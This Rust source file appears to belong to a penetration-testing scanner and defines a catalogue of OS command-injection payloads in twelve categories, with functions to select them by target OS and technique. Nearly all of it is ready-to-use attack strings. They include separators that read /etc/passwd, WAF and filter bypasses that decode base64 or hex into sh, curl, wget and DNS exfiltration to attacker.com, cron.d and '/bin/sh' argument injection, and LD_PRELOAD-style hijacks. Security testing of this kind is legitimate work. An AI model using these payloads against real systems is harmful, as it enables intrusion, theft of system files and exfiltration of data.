/// OS command injection payload generator supporting Linux and Windows targets.
///
/// Generates payloads across 12 injection categories: inline, newline, time-based blind,
/// DNS-based OOB, backtick/subshell, WAF bypass, chained operators, Windows-specific,
/// argument injection, environment variable injection, filter bypass, and truncation/comment.

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TargetOs {
    Linux,
    Windows,
    Both,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum InjectionCategory {
    Inline,
    Newline,
    TimeBasedBlind,
    DnsBasedOob,
    BacktickSubshell,
    WafBypass,
    ChainedOperator,
    WindowsSpecific,
    ArgumentInjection,
    EnvironmentVariable,
    FilterBypass,
    TruncationComment,
}

impl InjectionCategory {
    pub fn all() -> &'static [InjectionCategory] {
        &[
            InjectionCategory::Inline,
            InjectionCategory::Newline,
            InjectionCategory::TimeBasedBlind,
            InjectionCategory::DnsBasedOob,
            InjectionCategory::BacktickSubshell,
            InjectionCategory::WafBypass,
            InjectionCategory::ChainedOperator,
            InjectionCategory::WindowsSpecific,
            InjectionCategory::ArgumentInjection,
            InjectionCategory::EnvironmentVariable,
            InjectionCategory::FilterBypass,
            InjectionCategory::TruncationComment,
        ]
    }
}

#[derive(Debug, Clone)]
pub struct CommandInjectionPayload {
    pub payload: &'static str,
    pub category: InjectionCategory,
    pub target_os: TargetOs,
    pub description: &'static str,
}

const INLINE_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "; id",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "semicolon separator with id",
    },
    CommandInjectionPayload {
        payload: "; whoami",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "semicolon separator with whoami",
    },
    CommandInjectionPayload {
        payload: "; uname -a",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "semicolon separator with uname",
    },
    CommandInjectionPayload {
        payload: "; cat /etc/passwd",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "semicolon separator reading passwd",
    },
    CommandInjectionPayload {
        payload: "| id",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "pipe into id",
    },
    CommandInjectionPayload {
        payload: "| cat /etc/passwd",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "pipe into cat passwd",
    },
    CommandInjectionPayload {
        payload: "| whoami",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Both,
        description: "pipe into whoami",
    },
    CommandInjectionPayload {
        payload: "&& id",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "AND operator with id",
    },
    CommandInjectionPayload {
        payload: "&& whoami",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Both,
        description: "AND operator with whoami",
    },
    CommandInjectionPayload {
        payload: "|| id",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "OR operator with id",
    },
    CommandInjectionPayload {
        payload: "|| whoami",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Both,
        description: "OR operator with whoami",
    },
    CommandInjectionPayload {
        payload: "; ls -la /",
        category: InjectionCategory::Inline,
        target_os: TargetOs::Linux,
        description: "semicolon with directory listing",
    },
];

const NEWLINE_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "%0aid",
        category: InjectionCategory::Newline,
        target_os: TargetOs::Linux,
        description: "URL-encoded LF newline injection",
    },
    CommandInjectionPayload {
        payload: "%0awhoami",
        category: InjectionCategory::Newline,
        target_os: TargetOs::Both,
        description: "URL-encoded LF with whoami",
    },
    CommandInjectionPayload {
        payload: "%0d%0aid",
        category: InjectionCategory::Newline,
        target_os: TargetOs::Linux,
        description: "URL-encoded CRLF newline injection",
    },
    CommandInjectionPayload {
        payload: "%0d%0awhoami",
        category: InjectionCategory::Newline,
        target_os: TargetOs::Both,
        description: "CRLF with whoami",
    },
    CommandInjectionPayload {
        payload: "%0acat%20/etc/passwd",
        category: InjectionCategory::Newline,
        target_os: TargetOs::Linux,
        description: "LF with cat passwd URL-encoded spaces",
    },
    CommandInjectionPayload {
        payload: "\nid",
        category: InjectionCategory::Newline,
        target_os: TargetOs::Linux,
        description: "literal newline with id",
    },
    CommandInjectionPayload {
        payload: "\r\nid",
        category: InjectionCategory::Newline,
        target_os: TargetOs::Linux,
        description: "literal CRLF with id",
    },
    CommandInjectionPayload {
        payload: "%0a%0d%0a%0did",
        category: InjectionCategory::Newline,
        target_os: TargetOs::Linux,
        description: "double CRLF newline injection",
    },
];

const TIME_BASED_BLIND_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "; sleep 5",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "semicolon sleep 5 seconds",
    },
    CommandInjectionPayload {
        payload: "| sleep 5",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "pipe sleep 5 seconds",
    },
    CommandInjectionPayload {
        payload: "&& sleep 5",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "AND sleep 5 seconds",
    },
    CommandInjectionPayload {
        payload: "|| sleep 5",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "OR sleep 5 seconds",
    },
    CommandInjectionPayload {
        payload: "; sleep 10",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "semicolon sleep 10 seconds",
    },
    CommandInjectionPayload {
        payload: "; ping -c 5 127.0.0.1",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "ping-based time delay",
    },
    CommandInjectionPayload {
        payload: "&& ping -c 5 127.0.0.1",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "AND ping-based time delay",
    },
    CommandInjectionPayload {
        payload: "|| timeout /t 5",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Windows,
        description: "OR Windows timeout delay",
    },
    CommandInjectionPayload {
        payload: "&& timeout /t 5",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Windows,
        description: "AND Windows timeout delay",
    },
    CommandInjectionPayload {
        payload: "| timeout /t 5",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Windows,
        description: "pipe Windows timeout delay",
    },
    CommandInjectionPayload {
        payload: "& ping -n 5 127.0.0.1",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Windows,
        description: "Windows ping time delay",
    },
    CommandInjectionPayload {
        payload: "$(sleep 5)",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "subshell sleep",
    },
    CommandInjectionPayload {
        payload: "`sleep 5`",
        category: InjectionCategory::TimeBasedBlind,
        target_os: TargetOs::Linux,
        description: "backtick sleep",
    },
];

const DNS_BASED_OOB_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "; nslookup $(whoami).attacker.com",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Linux,
        description: "nslookup with whoami exfil",
    },
    CommandInjectionPayload {
        payload: "; dig $(id).oob.com",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Linux,
        description: "dig with id exfil",
    },
    CommandInjectionPayload {
        payload: "; host $(whoami).oob.com",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Linux,
        description: "host command with whoami exfil",
    },
    CommandInjectionPayload {
        payload: "| nslookup $(cat /etc/hostname).oob.com",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Linux,
        description: "nslookup with hostname exfil",
    },
    CommandInjectionPayload {
        payload: "; curl http://attacker.com/$(whoami)",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Linux,
        description: "curl-based HTTP exfil",
    },
    CommandInjectionPayload {
        payload: "; wget http://attacker.com/$(id)",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Linux,
        description: "wget-based HTTP exfil",
    },
    CommandInjectionPayload {
        payload: "| curl attacker.com -d @/etc/passwd",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Linux,
        description: "curl POST file exfil",
    },
    CommandInjectionPayload {
        payload: "& nslookup %USERNAME%.attacker.com",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Windows,
        description: "Windows nslookup username exfil",
    },
    CommandInjectionPayload {
        payload: "& ping %USERNAME%.attacker.com",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Windows,
        description: "Windows ping-based DNS exfil",
    },
    CommandInjectionPayload {
        payload: "; nslookup `uname -n`.oob.com",
        category: InjectionCategory::DnsBasedOob,
        target_os: TargetOs::Linux,
        description: "backtick nslookup exfil",
    },
];

const BACKTICK_SUBSHELL_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "`id`",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "backtick id execution",
    },
    CommandInjectionPayload {
        payload: "`whoami`",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "backtick whoami execution",
    },
    CommandInjectionPayload {
        payload: "$(id)",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "subshell id execution",
    },
    CommandInjectionPayload {
        payload: "$(whoami)",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "subshell whoami execution",
    },
    CommandInjectionPayload {
        payload: "$(cat /etc/passwd)",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "subshell cat passwd",
    },
    CommandInjectionPayload {
        payload: "`cat /etc/passwd`",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "backtick cat passwd",
    },
    CommandInjectionPayload {
        payload: "$(uname -a)",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "subshell uname",
    },
    CommandInjectionPayload {
        payload: "$((1+1))",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "arithmetic subshell",
    },
    CommandInjectionPayload {
        payload: "x$(id)x",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "embedded subshell in string",
    },
    CommandInjectionPayload {
        payload: "x`id`x",
        category: InjectionCategory::BacktickSubshell,
        target_os: TargetOs::Linux,
        description: "embedded backtick in string",
    },
];

const WAF_BYPASS_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: ";${IFS}id",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "IFS as space bypass",
    },
    CommandInjectionPayload {
        payload: ";${IFS}cat${IFS}/etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "IFS space bypass for cat",
    },
    CommandInjectionPayload {
        payload: "{cat,/etc/passwd}",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "brace expansion bypass",
    },
    CommandInjectionPayload {
        payload: "c$()a$()t /etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "empty subshell word splitting",
    },
    CommandInjectionPayload {
        payload: "w$()h$()o$()a$()m$()i",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "empty subshell for whoami",
    },
    CommandInjectionPayload {
        payload: "/???/??t /???/p??s??",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "glob wildcard path bypass",
    },
    CommandInjectionPayload {
        payload: ";$'\\x63\\x61\\x74'$'\\x20'/etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "hex-encoded cat command",
    },
    CommandInjectionPayload {
        payload: ";$(printf '\\x69\\x64')",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "printf hex-encoded id",
    },
    CommandInjectionPayload {
        payload: ";{c'a't,/etc/passwd}",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "quoted brace expansion",
    },
    CommandInjectionPayload {
        payload: ";ca$@t /etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "empty variable splitting",
    },
    CommandInjectionPayload {
        payload: ";ca\\t /etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "backslash escape bypass",
    },
    CommandInjectionPayload {
        payload: "$'cat' /etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "ANSI-C quoting bypass",
    },
    CommandInjectionPayload {
        payload: ";/???/c?t /etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "partial glob path bypass",
    },
    CommandInjectionPayload {
        payload: ";cat<>/etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "redirect operator bypass",
    },
    CommandInjectionPayload {
        payload: ";cat$IFS/etc/passwd",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "IFS without braces",
    },
    CommandInjectionPayload {
        payload: "$(echo${IFS}id)",
        category: InjectionCategory::WafBypass,
        target_os: TargetOs::Linux,
        description: "echo piped to execution via IFS",
    },
];

const CHAINED_OPERATOR_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "; id; whoami",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "double semicolon chain",
    },
    CommandInjectionPayload {
        payload: "| id | base64",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "pipe chain with encoding",
    },
    CommandInjectionPayload {
        payload: "&& id && whoami",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "double AND chain",
    },
    CommandInjectionPayload {
        payload: "|| id || whoami",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "double OR chain",
    },
    CommandInjectionPayload {
        payload: "; id > /tmp/out",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "redirect output to file",
    },
    CommandInjectionPayload {
        payload: "; id >> /tmp/out",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "append output to file",
    },
    CommandInjectionPayload {
        payload: "< /etc/passwd",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "input redirection",
    },
    CommandInjectionPayload {
        payload: "; cat /etc/passwd | head -1",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "pipe chain with head",
    },
    CommandInjectionPayload {
        payload: "&& cat /etc/passwd | grep root",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "AND with pipe grep",
    },
    CommandInjectionPayload {
        payload: "; (id)",
        category: InjectionCategory::ChainedOperator,
        target_os: TargetOs::Linux,
        description: "parenthesized subshell",
    },
];

const WINDOWS_SPECIFIC_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "& dir",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "ampersand dir listing",
    },
    CommandInjectionPayload {
        payload: "& dir C:\\",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "ampersand dir C drive",
    },
    CommandInjectionPayload {
        payload: "| type C:\\Windows\\win.ini",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "pipe type win.ini",
    },
    CommandInjectionPayload {
        payload: "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "pipe type hosts file",
    },
    CommandInjectionPayload {
        payload: "%COMSPEC% /c whoami",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "COMSPEC cmd execution",
    },
    CommandInjectionPayload {
        payload: "& net user",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "ampersand net user listing",
    },
    CommandInjectionPayload {
        payload: "& ipconfig /all",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "ampersand ipconfig",
    },
    CommandInjectionPayload {
        payload: "& systeminfo",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "ampersand systeminfo",
    },
    CommandInjectionPayload {
        payload: "| powershell -c whoami",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "pipe powershell execution",
    },
    CommandInjectionPayload {
        payload: "& cmd /c dir",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "cmd /c dir execution",
    },
    CommandInjectionPayload {
        payload: "| set",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "pipe environment dump",
    },
    CommandInjectionPayload {
        payload: "& echo %PATH%",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "ampersand PATH dump",
    },
    CommandInjectionPayload {
        payload: "& powershell -enc dwBoAG8AYQBtAGkA",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "base64-encoded powershell",
    },
    CommandInjectionPayload {
        payload: "& wmic os get caption",
        category: InjectionCategory::WindowsSpecific,
        target_os: TargetOs::Windows,
        description: "wmic OS info",
    },
];

const ARGUMENT_INJECTION_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "--output=/etc/cron.d/shell",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "cron.d output hijack",
    },
    CommandInjectionPayload {
        payload: "-exec /bin/sh",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "exec argument with shell",
    },
    CommandInjectionPayload {
        payload: "--help; id",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "help flag with injection",
    },
    CommandInjectionPayload {
        payload: "-v --output=/tmp/pwned",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "verbose flag with output redirect",
    },
    CommandInjectionPayload {
        payload: "--config=/dev/null",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "config path hijack",
    },
    CommandInjectionPayload {
        payload: "-o /tmp/out.txt",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "output flag injection",
    },
    CommandInjectionPayload {
        payload: "--proxy=http://attacker.com:8080",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Both,
        description: "proxy argument injection",
    },
    CommandInjectionPayload {
        payload: "-L /tmp/evil.so",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "library path injection",
    },
    CommandInjectionPayload {
        payload: "-T /etc/passwd",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "upload flag file exfil",
    },
    CommandInjectionPayload {
        payload: "--post-file=/etc/passwd",
        category: InjectionCategory::ArgumentInjection,
        target_os: TargetOs::Linux,
        description: "wget post-file exfil",
    },
];

const ENVIRONMENT_VARIABLE_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "LD_PRELOAD=/tmp/evil.so id",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Linux,
        description: "LD_PRELOAD shared object injection",
    },
    CommandInjectionPayload {
        payload: "PATH=/tmp:$PATH id",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Linux,
        description: "PATH prepend hijack",
    },
    CommandInjectionPayload {
        payload: "LD_LIBRARY_PATH=/tmp id",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Linux,
        description: "library path hijack",
    },
    CommandInjectionPayload {
        payload: "PYTHONPATH=/tmp python -c 'import os;os.system(\"id\")'",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Linux,
        description: "PYTHONPATH hijack",
    },
    CommandInjectionPayload {
        payload: "NODE_OPTIONS='--require=/tmp/evil.js' node",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Linux,
        description: "NODE_OPTIONS require injection",
    },
    CommandInjectionPayload {
        payload: "PERL5OPT=-e'system(\"id\")'",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Linux,
        description: "Perl options injection",
    },
    CommandInjectionPayload {
        payload: "RUBYOPT=-e'system(\"id\")'",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Linux,
        description: "Ruby options injection",
    },
    CommandInjectionPayload {
        payload: "HTTP_PROXY=http://attacker.com:8080",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Both,
        description: "HTTP proxy hijack",
    },
    CommandInjectionPayload {
        payload: "JAVA_TOOL_OPTIONS=-javaagent:/tmp/evil.jar",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Both,
        description: "Java agent injection",
    },
    CommandInjectionPayload {
        payload: "GIT_SSH_COMMAND='id >'",
        category: InjectionCategory::EnvironmentVariable,
        target_os: TargetOs::Linux,
        description: "Git SSH command hijack",
    },
];

const FILTER_BYPASS_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: ";i\\d",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "backslash mid-word bypass",
    },
    CommandInjectionPayload {
        payload: ";'i''d'",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "single-quote splitting",
    },
    CommandInjectionPayload {
        payload: ";\"i\"\"d\"",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "double-quote splitting",
    },
    CommandInjectionPayload {
        payload: ";i${DOESNT_EXIST}d",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "empty variable mid-word",
    },
    CommandInjectionPayload {
        payload: ";/bin/cat /etc/passwd",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "absolute path bypass",
    },
    CommandInjectionPayload {
        payload: ";/usr/bin/id",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "absolute path id",
    },
    CommandInjectionPayload {
        payload: ";rev<<<'di'",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "rev herestring reversal bypass",
    },
    CommandInjectionPayload {
        payload: ";$(rev<<<'di')",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "subshell rev bypass",
    },
    CommandInjectionPayload {
        payload: ";echo aWQ= | base64 -d | sh",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "base64-encoded command bypass",
    },
    CommandInjectionPayload {
        payload: ";echo 6964 | xxd -r -p | sh",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "hex-encoded command bypass",
    },
    CommandInjectionPayload {
        payload: ";eval $(echo 'aWQ=' | base64 -d)",
        category: InjectionCategory::FilterBypass,
        target_os: TargetOs::Linux,
        description: "eval base64 decode bypass",
    },
];

const TRUNCATION_COMMENT_PAYLOADS: &[CommandInjectionPayload] = &[
    CommandInjectionPayload {
        payload: "; id #",
        category: InjectionCategory::TruncationComment,
        target_os: TargetOs::Linux,
        description: "hash comment truncation",
    },
    CommandInjectionPayload {
        payload: "; id %00",
        category: InjectionCategory::TruncationComment,
        target_os: TargetOs::Both,
        description: "null byte truncation",
    },
    CommandInjectionPayload {
        payload: "& dir REM ",
        category: InjectionCategory::TruncationComment,
        target_os: TargetOs::Windows,
        description: "Windows REM comment truncation",
    },
    CommandInjectionPayload {
        payload: "; id ;#",
        category: InjectionCategory::TruncationComment,
        target_os: TargetOs::Linux,
        description: "double terminator with comment",
    },
    CommandInjectionPayload {
        payload: "| id %00 --",
        category: InjectionCategory::TruncationComment,
        target_os: TargetOs::Linux,
        description: "null byte with SQL-style comment",
    },
    CommandInjectionPayload {
        payload: "&& id %0a#",
        category: InjectionCategory::TruncationComment,
        target_os: TargetOs::Linux,
        description: "newline then comment",
    },
];

const ALL_PAYLOAD_SLICES: &[&[CommandInjectionPayload]] = &[
    INLINE_PAYLOADS,
    NEWLINE_PAYLOADS,
    TIME_BASED_BLIND_PAYLOADS,
    DNS_BASED_OOB_PAYLOADS,
    BACKTICK_SUBSHELL_PAYLOADS,
    WAF_BYPASS_PAYLOADS,
    CHAINED_OPERATOR_PAYLOADS,
    WINDOWS_SPECIFIC_PAYLOADS,
    ARGUMENT_INJECTION_PAYLOADS,
    ENVIRONMENT_VARIABLE_PAYLOADS,
    FILTER_BYPASS_PAYLOADS,
    TRUNCATION_COMMENT_PAYLOADS,
];

pub fn all_payloads() -> Vec<&'static CommandInjectionPayload> {
    ALL_PAYLOAD_SLICES
        .iter()
        .flat_map(|slice| slice.iter())
        .collect()
}

pub fn payloads_for_os(os: TargetOs) -> Vec<&'static CommandInjectionPayload> {
    all_payloads()
        .into_iter()
        .filter(|p| p.target_os == os || p.target_os == TargetOs::Both)
        .collect()
}

pub fn payloads_for_category(category: InjectionCategory) -> Vec<&'static CommandInjectionPayload> {
    all_payloads()
        .into_iter()
        .filter(|p| p.category == category)
        .collect()
}

pub fn payloads_for_os_and_category(
    os: TargetOs,
    category: InjectionCategory,
) -> Vec<&'static CommandInjectionPayload> {
    all_payloads()
        .into_iter()
        .filter(|p| (p.target_os == os || p.target_os == TargetOs::Both) && p.category == category)
        .collect()
}

pub fn blind_detection_payloads() -> Vec<&'static CommandInjectionPayload> {
    let mut results = payloads_for_category(InjectionCategory::TimeBasedBlind);
    results.extend(payloads_for_category(InjectionCategory::DnsBasedOob));
    results
}

pub fn waf_bypass_techniques() -> Vec<&'static CommandInjectionPayload> {
    let mut results = payloads_for_category(InjectionCategory::WafBypass);
    results.extend(payloads_for_category(InjectionCategory::FilterBypass));
    results
}

pub fn category_count() -> usize {
    InjectionCategory::all().len()
}

pub fn total_payload_count() -> usize {
    ALL_PAYLOAD_SLICES.iter().map(|s| s.len()).sum()
}
